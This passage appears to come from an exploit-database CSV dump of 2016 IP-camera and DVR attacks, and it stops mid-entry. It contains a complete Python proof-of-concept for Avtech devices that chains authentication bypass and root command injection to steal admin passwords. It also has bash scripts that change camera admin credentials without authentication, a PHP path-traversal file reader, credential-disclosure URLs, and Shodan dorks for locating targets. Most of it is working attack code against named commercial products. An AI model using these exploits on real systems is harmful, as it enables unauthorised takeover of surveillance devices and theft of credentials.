provides the cgi_query action, which performs an HTTP request with the
specified parameters. By modifying the ip, port and queryb64str
parameters, an attacker is able to perform arbitrary HTTP requests
through the DVR device without authentication.
POC:
5) Unauthenticated command injection in DVR devices
The cgi_query action in Search.cgi performs HTML requests with the wget
system command, which uses the received parameters without sanitization
or verification. By exploiting this issue, an attacker can execute any
system command with root privileges without authentication.
POC:
6) Authentication bypass #1
Video player plugins are stored as .cab files in the web root, which can
be accessed and downloaded without authentication. The cab file request
verification in the streamd web server is performed with the strstr
function, which means that a request should not be authenticated if it
contains the ô.cabö string anywhere in the URL. We note that some of the
models contain an additional check in the CgiDaemon, which allows
unauthenticated cgi access only under the /cgi-bin/nobody folder.
POC:
7) Authentication bypass #2
Cgi scripts in the /cgi-bin/nobody folder can be accessed without
authentication (e.g. for login). The streamd web server verifies whether
the request can be performed without authentication by searching for the
ô/nobodyö string in the URL with  the strstr function. Thus, if a
request contains the ""/nobody"" string anywhere in the URL, it does not
have to be authenticated. We note that some of the models contain an
additional check in the CgiDaemon, which allows unauthenticated cgi
access only under the /cgi-bin/nobody folder.
POC:
8) Unauthenticated file download from web root
If a cab file is requested, the web server sends the file without
processing it. Because the streamd web server verifies the cab file
request by searching for the ô.cabö string in the URL with the strstr
function, any file (even the cgi scripts) in the web root can be
downloaded without authentication.
POC: http://<device_ip>/cgi-bin/cgibox?.cab
9) Login captcha bypass #1
To prevent brute-forcing attempts, Avtech devices require a captcha for
login requests. However, if the login requests contain the login=quick
parameter, the captcha verification is bypassed.
POC:
10) Login captcha bypass #2
Instead of using a random session ID, Avtech devices use the
base64-encoded username and password as the Cookie value. Since the IP
address of the logged in user is not stored, if an attacker sets the
Cookie manually, the captcha verification can by bypassed easily.
11) Authenticated command injection in CloudSetup.cgi
Devices that support the Avtech cloud contain CloudSetup.cgi, which can
be accessed after authentication. The exefile parameter of a
CloudSetup.cgi request specifies the system command to be executed.
Since there is no verification or white list-based checking of the
exefile parameter, an attacker can execute arbitrary system commands
with root privileges.
POC: http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps
12) Authenticated command injection in adcommand.cgi
Some of the Avtech devices contain adcommand.cgi to perform ActionD
commands. The adcommand.cgi can be accessed after authentication. In
newer devices the ActionD daemon provides the DoShellCmd function, which
performs a system call with the specified parameters. Since there is no
verification or white list-based checking of the parameter of the
DoShellCmd function, an attacker can execute arbitrary system commands
with root privileges.
POC:
POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1
Host: <device_ip>
Content-Length: 23
Cookie: SSID=YWRtaW46YWRtaW4=
DoShellCmd ""strCmd=ps&""
13) Authenticated command injection in PwdGrp.cgi
The PwdGrp.cgi uses the username, password and group parameters in a new
user creation or modification request in a system command without
validation or sanitization. Thus and attacker can execute arbitrary
system commands with root privileges.
We are aware that this vulnerability is being exploited in the wild!
POC:
14) HTTPS used without certificate verification
The SyncCloudAccount.sh, QueryFromClient.sh and SyncPermit.sh scripts
use wget to access HTTPS sites, such as https://payment.eagleeyes.tw, by
specifying the no-check-certificate parameter. Thus wget skips server
certificate verification and a MITM attack is possible against the HTTPS
communication.
Timeline
2015.10.19: First attempt to contact with Avtech, but we did not receive
any response
2016.05.24: Second attempt to contact Avtech without any response
2016.05.27: Third attempt to contact Avtech by sending e-mail to public
Avtech e-mail addresses. We did not receive any response.
2016.xx.xx: Full disclosure
POC
POC script is available to demonstrate the following problems [3]:
- Unauthenticated information leakage (capabilities)
- Authentication bypass (.cab, nobody)
- Unauthenticated SSRF on DVR devices
- Unauthenticated command injection on DVR devices
- Login captcha bypass with login=quick or manual cookie creation
- CloudSetup.cgi command injection after authentication
- adcommand.cgi command injection after authentication
A video demonstration is also available [1], which presents some of the
above problems.
Recommendations
Unfortunately there is no solution available for these vulnerabilities
at the moment. You can take the following steps to protect your device:
- Change the default admin password
- Never expose the web interface of any Avtech device to the internet
We note that the above vulnerabilities were found within a short period
of time without a systematic approach. Based on the vulnerability types
we found and the overall code quality, the devices should contain much
more problems.
Credits
This vulnerability was discovered and researched by Gergely Eberhardt
(@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
References
[1]
<http://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities>
[2] https://youtu.be/BUx8nLlIMxI
[3] https://github.com/ebux/AVTECH
[4] http://www.search-lab.hu/media/vulnerability_matrix.txt
import sys
import requests
import base64
class avtech:
AVTECH_BYP_NONE = 0
AVTECH_BYP_CAB = 1
AVTECH_BYP_NOBODY = 2
def __init__(self, addr, port):
self.addr = addr
self.port = port
self.s = requests.Session()
self.auth = False
self.authbyp_str = {self.AVTECH_BYP_NONE:'', self.AVTECH_BYP_CAB:'.cab&', self.AVTECH_BYP_NOBODY:'/nobody&'}
self.authbyp = self.AVTECH_BYP_NONE
self.username = ''
self.password = ''
self.cabbyp = False
self.nobodybyp = False
self.firmware_version = ''
self.product_type = ''
self.product_id = ''
self.mac_address = ''
def getUri(self, uri, param, bypass=False):
if (bypass):
return 'http://%s:%d/%s?%s%s'%(self.addr, self.port, uri, self.authbyp_str[self.authbyp], param)
else:
return 'http://%s:%d/%s?%s'%(self.addr, self.port, uri, param)
def setPwd(self, usr, pwd):
self.username = usr
self.password = pwd
def setCookie(self):
self.s.cookies['SSID'] = base64.b64encode('%s:%s'%(self.username,self.password))
self.auth = True
def login(self):
self.s = requests.Session()
r = self.s.get(self.getUri('/cgi-bin/nobody/VerifyCode.cgi', 'account=%s&login=quick'%(base64.b64encode('%s:%s'%(self.username,self.password)))))
res = r.text.split()
if (int(res[0]) == -35):
return False
if (int(res[0]) == 0):
self.auth = True
return True
return False
def checkBypass(self):
if (self.auth):
return 'Session is already authenticated, you do not have to bypass!'
ret = ''
greq = '&action=get&category=Account.*'
try:
r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','.cab%s'%(greq)))
if (len(r.text) > 0 and r.text[0] == '0'):
ret += '.cab authentication bypass was successful, '
self.authbyp = self.AVTECH_BYP_CAB
self.cabbyp = True
except:
ret += '.cab authentication bypass was not successful, '
try:
r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','/nobody%s'%(greq)))
if (len(r.text) > 0 and r.text[0] == '0'):
ret += '/nobody authentication bypass was successful'
self.nobodybyp = True
if (self.authbyp == self.AVTECH_BYP_NONE):
self.authbyp = self.AVTECH_BYP_NOBODY
except:
ret += '/nobody authentication bypass was not successful'
return ret
def getAdminPwd(self):
r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','action=get&category=Account.*', True))
for l in r.text.split():
lp = l.split('=')
if (len(lp) == 2):
if (lp[0] == 'Account.User1.Username'):
self.username = lp[1]
elif (lp[0] == 'Account.User1.Password'):
self.password = lp[1]
break
if (lp[0] == 'Account.User2.Username'):
self.username = lp[1]
elif (lp[0] == 'Account.User2.Password'):
self.password = lp[1]
break
if (lp[0] == 'Account.User3.Username'):
self.username = lp[1]
elif (lp[0] == 'Account.User3.Password'):
self.password = lp[1]
break
def getFwVersion(self):
r = self.s.get(self.getUri('/cgi-bin/user/Config.cgi','action=get&category=Properties.Firmware.*', False))
print r.text
def getLogin(self):
r = self.s.get(self.getUri('/cgi-bin/guest/Login.cgi','rnd=0.5', False))
print r.text
def commandInjection(self, cmd):
try:
r = self.s.get(self.getUri('/cgi-bin/supervisor/CloudSetup.cgi','exefile=%s'%(cmd), False))
return r.text
except:
print 'CloudSetup.cgi command injection test failed'
def commandInjection2(self, cmd):
data = 'DoShellCmd ""strCmd=%s&""'%(cmd)
r = self.s.post(self.getUri('/cgi-bin/supervisor/adcommand.cgi','', False), data=data)
return r.text
def parseCapability(self, cap):
for l in cap.split('\n'):
ld = l.strip().split('=')
if (len(ld)==2):
if (ld[0] == 'Firmware.Version'):
self.firmware_version = ld[1]
elif (ld[0] == 'Product.Type'):
self.product_type = ld[1]
elif (ld[0] == 'Product.ID'):
self.product_id = ld[1]
elif (ld[0] == 'MACAddress'):
self.mac_address = ld[1]
def getCapability(self):
r = self.s.get(self.getUri('/cgi-bin/nobody/Machine.cgi','action=get_capability', False))
self.parseCapability(r.text)
return r.text
def checkSearch(self):
try:
r = self.s.get(self.getUri('/cgi-bin/nobody/Search.cgi','action=scan', False))
return r.text
except:
return ''
def checkCgiQuery(self):
try:
r = self.s.get(self.getUri('/cgi-bin/nobody/Search.cgi','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==', False))
if (len(r.text)>=4 and r.text[0:4] == '0\nOK'):
return True
else:
return False
except:
return False
def searchCmdInjection(self, command):
cmdstr = (' ;%s>$(ps|grep Search.cgi|grep -v grep|head -n 1|awk \'{print ""/tmp/""$1"".log""}\';)'%(command)).replace(' ', '%20')
uri = self.getUri('cgi-bin/nobody/Search.cgi','action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%s&password=admin'%(cmdstr),False)
print uri
r = self.s.get(uri)
return r.text
if __name__ == '__main__':
if (len(sys.argv) < 2):
print 'avtech_nas_pc.py addr [port]'
addr = sys.argv[1]
port = 80
if (len(sys.argv) == 3):
port = int(sys.argv[2])
avtech = avtech(addr, port)
cap = avtech.getCapability()
print cap
avtech.parseCapability(cap)
print '%s,%s,%s,%s'%(avtech.firmware_version, avtech.product_type, avtech.product_id, avtech.mac_address)
sr = avtech.checkSearch()
if (len(sr) > 0 and sr[0] == '0'):
cgi_query = avtech.checkCgiQuery()
if (cgi_query):
print 'SSRF was successful'
else:
print 'SSRF was not successful'
resp = avtech.searchCmdInjection('XmlAp r Account.User1.Username')
lines = resp.split('\n')
if (len(lines) >= 3):
pwd = lines[2].strip()
print 'User1 name: %s'%(pwd)
avtech.username = pwd
resp = avtech.searchCmdInjection('XmlAp r Account.User1.Password')
lines = resp.split('\n')
if (len(lines) >= 3):
pwd = lines[2].strip()
print 'User1 password: %s'%(pwd)
avtech.password = pwd
print 'Authentication bypass check'
print avtech.checkBypass()
print 'Try to get admin password'
print avtech.getAdminPwd()
default = False
if (avtech.password == ''):
avtech.setPwd('admin', 'admin')
default = True
avtech.login()
if (not avtech.auth and not default and avtech.password != ''):
avtech.setCookie()
if (avtech.auth):
print 'Get admin password'
avtech.getAdminPwd()
print 'Get login'
avtech.getLogin()
print 'Get fw version'
avtech.getFwVersion()
print 'cloud command injection'
print avtech.commandInjection('ps')
print 'adcommand command injection'
print avtech.commandInjection2('cat /etc/passwd')"
2016-08-29,WebApps,CGI,Todor Donev,Intellinet IP Camera INT-L100M20N,Unauthorized Admin Credential Change,"#!/bin/bash
#  INTELLINET IP Camera INT-L100M20N remote change admin user/password
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""  [ INTELLINET IP Camera INT-L100M20N  remote change admin user/password""
echo ""  [ ===""
echo ""  [ Usage: $0 <target> <user> <password>""
echo ""  [ Example: $0 192.168.1.200:80 admin teflon""
echo ""  [ ===""
echo ""  [ Copyright 2016 (c) Todor Donev  <todor.donev at gmail.com>""
echo ""  [ Website:   http://www.ethical-hacker.org/""
echo ""  [ Facebook:  https://www.facebook.com/ethicalhackerorg ""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  [ Error : libwww-perl not found =/""
exit;
fi
GET -H ""Cookie: frame_rate=8; expansion=10; mode=43; user_id=guest; user_auth_level=43; behind_firewall=0"" ""http://$1/userconfigsubmit.cgi?adminid=$2&adpasswd=$3&repasswd=$3&user1=guest&userpw1=1337&repasswd1=1337&max_frame_user1=8&authority1=41&user2=&userpw2=&repasswd2=&max_frame_user2=6&authority2=40&user3=&userpw3=&repasswd3=&max_frame_user3=6&authority3=40&user4=&userpw4=&repasswd4=&max_frame_user4=6&authority4=40&user5=&userpw5=&repasswd5=&max_frame_user5=6&authority5=40&submit=submit"" 0&> /dev/null <&1"
2016-08-22,WebApps,Hardware,Yakir Wizman,VideoIQ Camera,Local File Disclosure,"# VideoIQ Camera Remote File Disclosure 0day Exploit
# VideoIQ develops intelligent video surveillance cameras using edge video IP security cameras paired with video analytics.
# Exploit Coded & Bug discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
# Date 20/08/2016
# Shodan Dork : title:""VideoIQ Camera Login""
# Version Affected : All Versions
# Vendor Homepage: http://avigilon.com
# CVE: N/A
# Description: VideoIQ is vulnerable to remote file disclosure which allows to any unauthenticated user read any file system including file configurations.
# Exploit code:","<?php
error_reporting(0);
$error[0] = ""[!] This script is intended to be launched from the cli."";
if(php_sapi_name() <> ""cli"")
die($error[0]);
if($argc < 3) {
echo(""\nUsage  : php {$argv[0]} <host> <port>"");
echo(""\nExample: php {$argv[0]} localhost 8080"");
die();
if(isset($argv[1]) && isset($argv[2])) {
$host = $argv[1];
$port = $argv[2];
$pack = ""GET /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{FILE_PATH} HTTP/1.0\r\n"";
$pack.= ""Host: {$host}\r\n"";
$pack.= ""Connection: close\r\n\r\n"";
while(1) {
if(strstr(http_send($host, $port, preg_replace(""/{FILE_PATH}/"", '/etc/passwd', $pack)), 'root')) {
echo(""\nAnonymous@{$host}:~# cat "");
if(($file = trim(fgets(STDIN))) == ""exit"")
break;
$ret = http_send($host, $port, preg_replace(""/{FILE_PATH}/"", $file, $pack));
if(strstr($ret, '<title>Error 404 NOT_FOUND</title>') || strstr($ret, '<p>Problem accessing') || strstr($ret, '<h2>HTTP ERROR 404</h2>')) {
echo(""cat: {$file}: No such file or directory"");
} else {
echo($ret);
} else {
echo(""[-] Server likely not vulnerable.\n"");
break;
function http_send($host, $port, $pack) {
if(!($sock = fsockopen($host, $port)))
die(""\n[-] No response from {$host}\n"");
fwrite($sock, $pack);
$response = explode(""\r\n\r\n"", stream_get_contents($sock));
return($response[1]);"
2016-08-22,WebApps,CGI,Yakir Wizman,Honeywell IP-Camera HICC-1100PT,Local File Disclosure,"http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
http://host:port/cgi-bin/check.cgi?file=config.ini","1. Advisory Information
Title                   : Honeywell IP-Camera (HICC-1100PT) Local File Inclusion
Vendor Homepage         : https://www.asia.security.honeywell.com
Remotely Exploitable: Yes
Tested on Camera types: HICC-1100PT
Reference               : https://www.asia.security.honeywell.com/Pages/product.aspx?category=720P-1.3M%20Box%20Camera&cat=HSG-ASIASECURITY&pid=HICC-1100T
Vulnerability           : Local File Inclusion (Critical/High)
Shodan Dork             : html:""Honeywell IP-Camera""
Date                    : 20/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
Honeywell IP-Camera (HICC-1100PT) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
4. Proof-of-Concept:
For example you can get /etc/passwd
Or config.ini file:
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-22,WebApps,CGI,Yakir Wizman,JVC IP-Camera VN-T216VPRU,Local File Disclosure,"http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
http://host:port/cgi-bin/check.cgi?file=config.ini","1. Advisory Information
Title                   : JVC IP-Camera (VN-T216VPRU) Local File Inclusion
Vendor Homepage         : http://pro.jvc.com/
Remotely Exploitable: Yes
Tested on Camera types: VN-T216VPRU
Product References      : http://pro.jvc.com/prof/attributes/features.jsp?model_id=MDL102145
Vulnerability           : Local File Inclusion (Critical/High)
Date                    : 20/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
JVC IP-Camera (VN-T216VPRU) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
4. Proof-of-Concept:
For example you can get /etc/passwd
Or config.ini file:
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-22,WebApps,CGI,Yakir Wizman,Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR,Local File Disclosure,"http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
http://host:port/cgi-bin/chklogin.cgi?file=../../../etc/passwd
http://host:port/cgi-bin/check.cgi?file=config.ini
http://host:port/cgi-bin/chklogin.cgi?file=config.ini","1. Advisory Information
Title                   : Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) Local File Inclusion
Vendor Homepage         : https://is.spiap.com/
Remotely Exploitable: Yes
Tested on Camera types: CCPW3025-IR , CVMW3025-IR
Product References      : https://is.spiap.com/products/video/1_cameras/11_ip_camerars/bullet-kameror/v54561-c117-a100.html
+                       : https://uk.spiap.com/products/video/1_cameras/11_ip_camerars/114_vandal_resistent_dome_cameras/cvmw3025-ir.html
Vulnerability           : Local File Inclusion (Critical/High)
Shodan Dork             : title:""Vanderbilt IP-Camera""
Date                    : 20/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
4. Proof-of-Concept:
For example you can get /etc/passwd
Or config.ini file:
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-19,WebApps,CGI,Todor Donev,MESSOA IP Cameras (Multiple Models),Password Change,"#  Multiple MESSOA IP-Cameras auth bypass admin user/password changer
#  Tested:
#  MESSOA NIC 835 Release: X.2.1.8
#  MESSOA NIC 835-HN5 Release: X.2.1.17
#  MESSOA NIC 836 Release: X.2.1.7
#  MESSOA NDZ 860 Release: X.3.0.6.1
#  MESSOA
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""  [ MESSOA IP-Cameras auth bypass admin user/password changer""
echo ""  [ ===""
echo ""  [ Usage: $0 <target> <user> <password>""
echo ""  [ Example: $0 192.168.1.200:80 hacker teflon""
echo ""  [ ===""
echo ""  [ Copyright 2016 (c) Todor Donev  <todor.donev at gmail.com>""
echo ""  [ Website:   http://www.ethical-hacker.org/""
echo ""  [ Facebook:  https://www.facebook.com/ethicalhackerorg ""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  [ Error : libwww-perl not found =/""
exit;
fi
GET ""http://$1/cgi-bin/writefile.cgi?DEFonoff_adm=&Adm_ID=$2&Adm_Pass1=$3&Adm_Pass2=$3&UpSectionName=ADMINID"" 0&> /dev/null <&1"
2016-08-19,WebApps,CGI,Todor Donev,MESSOA IP-Camera NIC990,Authentication Bypass / Configuration Download,"#  MESSOA NIC990 IP-Camera auth bypass configuration download
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
http://TARGET/cgi-bin/chklogin.cgi?file=config.ini",
2016-08-19,WebApps,CGI,Todor Donev,TOSHIBA IP-Camera IK-WP41A,Authentication Bypass / Configuration Download,"#  TOSHIBA IK-WP41A IP-Camera auth bypass configuration download
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
http://TARGET/cgi-bin/chklogin.cgi?file=config.ini",
2016-08-19,WebApps,CGI,Yakir Wizman,JVC IP-Camera VN-T216VPRU,Credentials Disclosure,http://host:port/cgi-bin/readfile.cgi?query=ADMINID,"1. Advisory Information
Title                   : JVC IP-Camera (VN-T216VPRU) Remote Credentials Disclosure
Vendor Homepage         : http://pro.jvc.com/
Remotely Exploitable: Yes
Tested on Camera types: VN-T216VPRU
Product References      : http://pro.jvc.com/prof/attributes/features.jsp?model_id=MDL102145
Vulnerability           : Username / Password Disclosure (Critical/High)
Date                    : 19/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
JVC IP-Camera (VN-T216VPRU) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
4. Proof-of-Concept:
Simply go to the following url:
Should return some javascript variable which contain the credentials and other configuration vars:
var Adm_ID=""admin""; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time=""0"";
Login @ http://host:port/cgi-bin/chklogin.cgi
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-19,WebApps,CGI,Yakir Wizman,Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR,Credentials Disclosure,http://host:port/cgi-bin/readfile.cgi?query=ADMINID,"1. Advisory Information
Title                   : Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) Remote Credentials Disclosure
Vendor Homepage         : https://is.spiap.com/
Remotely Exploitable: Yes
Tested on Camera types: CCPW3025-IR , CVMW3025-IR
Product References      : https://is.spiap.com/products/video/1_cameras/11_ip_camerars/bullet-kameror/v54561-c117-a100.html
+                       : https://uk.spiap.com/products/video/1_cameras/11_ip_camerars/114_vandal_resistent_dome_cameras/cvmw3025-ir.html
Vulnerability           : Username / Password Disclosure (Critical/High)
Shodan Dork             : title:""Vanderbilt IP-Camera""
Date                    : 19/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
4. Proof-of-Concept:
Simply go to the following url:
Should return some javascript variable which contain the credentials and other configuration vars:
var Adm_ID=""admin""; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time=""0"";
Login @ http://host:port/cgi-bin/chklogin.cgi
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-19,WebApps,CGI,Todor Donev,SIEMENS IP Cameras (Multiple Models),Credential Disclosure / Configuration Download,"#  Multiple SIEMENS IP Cameras auth bypass configuration download
#  Tested:
#  SIEMENS IP Camera CCID1410-ST X.1.0.24
#  SIEMENS IP Camera CCMW1025 x.2.2.1798
#  SIEMENS IP Camera CCMS2025 x.2.2.1798
#  SIEMENS IP Camera CVMS2025-IR x.2.2.1798
#  SIEMENS IP Camera CVMS2025-IR CxMS2025_V2458
#  SIEMENS IP Camera CVMS2025-IR CxMS2025_V2458_SP1
#  SIEMENS IP Camera CCPW5025-IR CCPWx025_V0.1.58
#  ...and more, more devices who use same firmware
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
http://TARGET/cgi-bin/chklogin.cgi?file=config.ini
http://TARGET/cgi-bin/check.cgi?file=ikwd03conf.ini",
2016-08-18,WebApps,CGI,Yakir Wizman,Honeywell IP-Camera HICC-1100PT,Credentials Disclosure,http://host:port/cgi-bin/readfile.cgi?query=ADMINID,"1. Advisory Information
Title                   : Honeywell IP-Camera (HICC-1100PT) Unauthenticated Remote Credentials Disclosure
Vendor Homepage         : https://www.asia.security.honeywell.com
Remotely Exploitable: Yes
Tested on Camera types: HICC-1100PT
Reference               : https://www.asia.security.honeywell.com/Pages/product.aspx?category=720P-1.3M%20Box%20Camera&cat=HSG-ASIASECURITY&pid=HICC-1100T
Vulnerability           : Username / Password Disclosure (Critical/High)
Shodan Dork             : html:""Honeywell IP-Camera""
Date                    : 18/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
Honeywell IP-Camera (HICC-1100PT) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
4. Proof-of-Concept:
Simply go to the following url:
Should return some javascript variable which contain the credentials and other configuration vars:
var Adm_ID=""admin""; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time=""0"";
Request:
GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1
Host: host:port
Connection: close
Response:
HTTP/1.0 200 OK
Connection: close
Content-type: text/html
var Adm_ID=""admin"";
var Adm_Pass1=“admin”;
var Adm_Pass2=“admin”;
var Language=“en”;
var Logoff_Time=""0"";
Login @ http://host:port/cgi-bin/chklogin.cgi
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-18,WebApps,CGI,Todor Donev,SIEMENS IP Camera CCMW1025 x.2.2.1798,Remote Admin Credentials Change,"#!/bin/bash
#  SIEMENS IP Camera CCMW1025 x.2.2.1798 remote change admin user/password
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 4 || $# -lt 3 ]]; then
echo ""  [ SIEMENS IP Camera CCMW1025 x.2.2.1798 remote change admin user/password""
echo ""  [ ==================================================""
echo ""  [ Usage: $0 <target> <user> <password> <repeat password>""
echo ""  [ Example: $0 192.168.1.200:80 hacker teflon teflon""
echo ""  [""
echo ""  [ Copyright 2016 (c) Todor Donev  <todor.donev at gmail.com>""
echo ""  [ http://www.ethical-hacker.org/  https://www.facebook.com/ethicalhackerorg ""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  [ Error : libwww-perl not found =/""
exit;
fi
GET ""http://$1/cgi-bin/writefile.cgi?DEFonoff_adm=&Adm_ID=$2&Adm_Pass1=$3&Adm_Pass2=$4&Language=en&Logoff_Time=0&UpSectionName=ADMINID"" 0&> /dev/null <&1"
2016-08-17,WebApps,CGI,Yakir Wizman,SIEMENS IP-Camera CVMS2025-IR / CCMS2025,Credentials Disclosure,http://host:port/cgi-bin/readfile.cgi?query=ADMINID,"1. Advisory Information
Title                   : SIEMENS IP-Camera Unauthenticated Remote Credentials Disclosure
Vendor Homepage         : https://www.siemens.com
Remotely Exploitable: Yes
Versions Affected       : x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235
Tested on Camera types: CVMS2025-IR, CCMS2025 (Camera type)
Reference for CCMS2025  : https://w5.siemens.com/web/cz/cz/corporate/portal/home/produkty_a_sluzby/IBT/pozarni_a_bezpecnostni_systemy/cctv/ip_kamery/Documents/023_CCIS1425_A6V10333969_en.doc.pdf
Vulnerability           : Username / Password Disclosure (Critical/High)
Shodan Dork             : title:""SIEMENS IP-Camera""
Date                    : 16/08/2016
Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
2. CREDIT
This vulnerability was identified during penetration test by Yakir Wizman.
3. Description
